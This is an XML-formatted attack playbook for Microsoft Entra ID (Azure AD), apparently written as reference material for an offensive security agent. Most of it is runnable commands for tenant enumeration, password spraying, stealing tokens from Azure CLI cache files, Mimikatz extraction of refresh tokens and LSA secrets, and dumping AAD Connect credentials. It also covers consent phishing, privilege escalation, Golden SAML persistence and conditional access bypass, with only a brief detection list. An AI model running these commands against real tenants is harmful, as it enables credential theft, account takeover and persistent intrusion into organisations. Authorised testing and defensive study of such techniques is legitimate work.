<vulnerability_guide>
  <title>AZURE AD / ENTRA ID ATTACKS</title>

  <critical>Azure AD (now Microsoft Entra ID) is the identity backbone for Microsoft 365 and Azure. Compromising Azure AD can provide access to cloud resources, on-premises environments via hybrid sync, and sensitive data across the organization.</critical>

  <scope>
    - Azure AD enumeration
    - Authentication attacks (password spray, token theft)
    - Privilege escalation paths
    - Application consent attacks
    - Hybrid identity exploitation
    - Conditional access bypass
  </scope>

  <methodology>
    1. AZURE AD ENUMERATION
       {% raw %}
       # Using AzureAD PowerShell
       Connect-AzureAD
       Get-AzureADUser -All $true
       Get-AzureADGroup -All $true
       Get-AzureADDirectoryRole
       Get-AzureADServicePrincipal -All $true

       # Using Microsoft Graph
       Connect-MgGraph -Scopes "User.Read.All","Group.Read.All"
       Get-MgUser -All
       Get-MgGroup -All

       # AzureHound for BloodHound
       azurehound list -u user@domain.com -p password -o output.json

       # ROADtools
       roadrecon auth -u user@domain.com -p password
       roadrecon gather
       roadrecon gui
       {% endraw %}

    2. PASSWORD SPRAY ATTACKS
       {% raw %}
       # Using MSOLSpray
       Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!"

       # Using Spray
       spray.py -emails users.txt -password "Password123" -url https://login.microsoftonline.com/tenant_id

       # Using Trevorspray
       trevorspray -e emails.txt -p "CompanyName2024!"

       # Check for smart lockout thresholds first
       # Default: 10 failed attempts per minute
       {% endraw %}

    3. TOKEN THEFT AND ABUSE
       {% raw %}
       # Steal tokens from az cli
       cat ~/.azure/accessTokens.json
       cat ~/.azure/msal_token_cache.json

       # Use stolen token
       $token = "eyJ0eX..."
       Connect-AzAccount -AccessToken $token -AccountId user@domain.com

       # Request token for different resource
       az account get-access-token --resource https://graph.microsoft.com

       # Primary Refresh Token (PRT) extraction
       Mimikatz# sekurlsa::cloudap
       Mimikatz# dpapi::cloudapkd /keyvalue:... /unprotect
       {% endraw %}

    4. APPLICATION CONSENT ATTACKS
       {% raw %}
       # Create malicious application
       # Request high-privilege permissions via OAuth consent

       # Illicit consent grant attack
       # Phish user to consent to app with:
       # - Mail.Read, Mail.Send
       # - Files.ReadWrite.All
       # - User.Read.All

       # Check for apps with excessive permissions
       Get-AzureADServicePrincipal | % {
         Get-AzureADServiceAppRoleAssignment -ObjectId $_.ObjectId
       }
       {% endraw %}
  </methodology>

  <advanced_techniques>
    <privilege_escalation>
      {% raw %}
      # Global Admin from Application Admin
      # If you have Application Admin + owns an app with high privileges

      # Add credentials to service principal
      $sp = Get-AzureADServicePrincipal -SearchString "TargetApp"
      New-AzureADServicePrincipalPasswordCredential -ObjectId $sp.ObjectId

      # Abuse directory roles
      Get-AzureADDirectoryRole | % {
        Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId
      }
      {% endraw %}
    </privilege_escalation>

    <hybrid_attacks>
      {% raw %}
      # Azure AD Connect - extract credentials
      # On AAD Connect server
      Get-ADSyncDatabaseConfiguration | fl

      # Dump service account
      Invoke-ADSyncDcPasswordRetrieval

      # Pass-through Authentication abuse
      # Compromise PTA agent for credential harvesting

      # Seamless SSO - extract machine account
      Mimikatz# lsadump::secrets
      # Look for AZUREADSSOACC$ computer account
      {% endraw %}
    </hybrid_attacks>

    <conditional_access_bypass>
      - Device compliance bypass via Intune enrollment
      - Location bypass via VPN/proxy
      - Legacy authentication protocols if enabled
      - Application exclusions
      - Break glass accounts
    </conditional_access_bypass>

    <persistence>
      {% raw %}
      # Add credentials to existing app
      New-AzureADApplicationPasswordCredential -ObjectId $appId

      # Register new service principal
      New-AzureADServicePrincipal -AppId $appId

      # Add federated identity provider (Golden SAML)
      # Requires access to ADFS token signing certificate

      # Add custom domain with federation
      {% endraw %}
    </persistence>
  </advanced_techniques>

  <detection>
    - Audit log: "Add service principal credentials"
    - Sign-in logs: Unusual locations, impossible travel
    - Consent grants for high-privilege permissions
    - New federation trust configurations
    - Service principal sign-ins without user context
  </detection>

  <validation>
    - Successfully enumerate Azure AD objects
    - Obtain valid access tokens
    - Escalate privileges within Azure AD
    - Access target cloud resources
    - Establish persistence mechanisms
  </validation>

  <pro_tips>
    - Always check managed identities on Azure VMs
    - IMDS endpoint (169.254.169.254) leaks tokens
    - Application Admin can escalate to Global Admin via app abuse
    - PRT gives SSO to all Azure AD-integrated apps
    - ROADtools provides excellent offline analysis
  </pro_tips>

  <remember>Azure AD is not just cloud - hybrid environments create bidirectional attack paths. Compromising on-prem AD can lead to Azure AD, and vice versa. Always enumerate both environments and look for sync accounts, federation trusts, and cross-environment privilege paths.</remember>
</vulnerability_guide>
